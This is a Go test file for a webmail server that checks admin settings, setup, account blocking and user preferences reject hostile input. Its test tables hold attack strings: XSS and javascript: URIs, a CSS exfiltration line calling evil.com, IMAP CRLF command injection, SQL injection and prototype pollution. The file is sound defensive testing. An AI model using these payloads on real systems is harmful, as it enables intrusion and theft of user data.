package server

import (
	"net/http"
	"strings"
	"testing"
)

func adminClient(t *testing.T) (*client, *Server) {
	ts, srv := newTestServer(t, "tok")
	c := newClient(t, ts.URL)
	code, body, _ := c.do("POST", "/api/setup/complete", `{"token":"tok","username":"admin","password":"long-password-1","settings":{"mail":{"imap":{"host":"127.0.0.1","port":1,"security":"none"},"smtp":{"host":"127.0.0.1","port":1,"security":"none"}},"access":{"mode":"domains","domains":["roosty.test"]}}}`, true)
	if code != http.StatusOK {
		t.Fatalf("setup: %d %v", code, body)
	}
	return c, srv
}

func TestAdminSettings_RejectsMaliciousJSON(t *testing.T) {
	c, srv := adminClient(t)
	before := srv.cfg.Get()
	attacks := map[string]string{
		"unknown field":            `{"isAdmin":true}`,
		"prototype pollution":      `{"__proto__":{"isAdmin":true}}`,
		"javascript support link":  `{"branding":{"links":{"support":"javascript:alert(document.cookie)"}}}`,
		"data uri privacy link":    `{"branding":{"links":{"privacy":"data:text/html,<script>alert(1)</script>"}}}`,
		"xss instance name":        `{"branding":{"name":"<img src=x onerror=alert(1)>"}}`,
		"css exfiltration":         `{"branding":{"customCss":"input{background:url(https://evil.com/x)}"}}`,
		"css breakout":             `{"branding":{"customCss":"</style><script>alert(1)</script>"}}`,
		"imap command injection":   `{"mail":{"imap":{"host":"x.com\r\nA1 LOGOUT","port":993,"security":"tls"}}}`,
		"invalid port type":        `{"mail":{"imap":{"host":"x.com","port":"993","security":"tls"}}}`,
		"wildcard domain":          `{"access":{"mode":"domains","domains":["*"]}}`,
		"sql in accounts":          `{"access":{"mode":"list","accounts":["' OR '1'='1"]}}`,
		"unknown theme":            `{"branding":{"themes":["claro","<x>"]}}`,
		"trailing data":            `{} {"isAdmin":true}`,
		"not an object":            `["x"]`,
		"invalid utf-8":            "{\"branding\":{\"name\":\"\xff\"}}",
		"deep nesting":             `{"branding":` + strings.Repeat("[", 20000) + strings.Repeat("]", 20000) + `}`,
	}
	for name, payload := range attacks {
		code, body, _ := c.do("PUT", "/api/admin/settings", payload, true)
		if code != http.StatusBadRequest {
			t.Errorf("%s: got %d %v, want 400", name, code, body)
		}
	}
	after := srv.cfg.Get()
	if after.Branding.Name != before.Branding.Name || after.Branding.Links != before.Branding.Links || after.Branding.CustomCSS != before.Branding.CustomCSS {
		t.Error("a rejected request changed stored settings")
	}
	// A valid partial update still works and keeps other fields.
	if code, body, _ := c.do("PUT", "/api/admin/settings", `{"branding":{"name":"Correio da Empresa","links":{"support":"https://ajuda.empresa.com","privacy":""}}}`, true); code != http.StatusOK {
		t.Fatalf("valid update refused: %d %v", code, body)
	}
	if got := srv.cfg.Get(); got.Branding.Name != "Correio da Empresa" || got.Mail.IMAP.Host != "127.0.0.1" {
		t.Errorf("partial update wrong: %+v", got.Branding)
	}
}

func TestSetup_RejectsMaliciousSettings(t *testing.T) {
	ts, srv := newTestServer(t, "tok")
	c := newClient(t, ts.URL)
	code, _, _ := c.do("POST", "/api/setup/complete", `{"token":"tok","username":"admin","password":"long-password-1","settings":{"branding":{"links":{"support":"javascript:alert(1)"}}}}`, true)
	if code != http.StatusBadRequest {
		t.Fatalf("got %d, want 400", code)
	}
	if srv.setupToken == "" {
		t.Error("a failed setup must not consume the token")
	}
	if code, _, _ := c.do("POST", "/api/setup/complete", `{"token":"tok","username":"admin","password":"long-password-1","role":"superuser"}`, true); code != http.StatusBadRequest {
		t.Errorf("unknown field accepted: %d", code)
	}
}

func TestAccountAction_RejectsInjection(t *testing.T) {
	c, _ := adminClient(t)
	for _, email := range []string{"' OR 1=1 --", "a@b.com\r\nX: y", "<script>@x.com", "", "a@localhost"} {
		if code, _, _ := c.do("POST", "/api/admin/accounts/block", `{"email":"`+strings.ReplaceAll(strings.ReplaceAll(email, "\r", `\r`), "\n", `\n`)+`"}`, true); code != http.StatusBadRequest {
			t.Errorf("email %q accepted: %d", email, code)
		}
	}
}

// If the database is tampered with, invalid preferences are never sent to the browser.
func TestPrefs_TamperedDatabaseIsIgnored(t *testing.T) {
	_, srv := newTestServer(t, "")
	_ = srv.st.TouchAccount("ana@roosty.test")
	_ = srv.st.SetPrefs("ana@roosty.test", []byte(`{"theme":"<script>alert(1)</script>","trustedSenders":["javascript:x"],"isAdmin":true}`))
	p := srv.loadPrefs("ana@roosty.test")
	if p.Theme != "" || len(p.TrustedSenders) != 0 {
		t.Fatalf("tampered prefs leaked: %+v", p)
	}
	if srv.trustedSender("ana@roosty.test", nil) {
		t.Error("no sender should be trusted")
	}
}

func TestPrefs_SaveValidatesAndAddTrusted(t *testing.T) {
	_, srv := newTestServer(t, "")
	_ = srv.st.TouchAccount("ana@roosty.test")
	if err := srv.addTrusted("ana@roosty.test", "javascript:alert(1)"); err == nil {
		t.Error("invalid trusted sender accepted")
	}
	if err := srv.addTrusted("ana@roosty.test", "News@Roosty.dev"); err != nil {
		t.Fatal(err)
	}
	_ = srv.addTrusted("ana@roosty.test", "news@roosty.dev") // duplicate is a no-op
	p := srv.loadPrefs("ana@roosty.test")
	if len(p.TrustedSenders) != 1 || p.TrustedSenders[0] != "news@roosty.dev" {
		t.Fatalf("trusted list wrong: %v", p.TrustedSenders)
	}
}
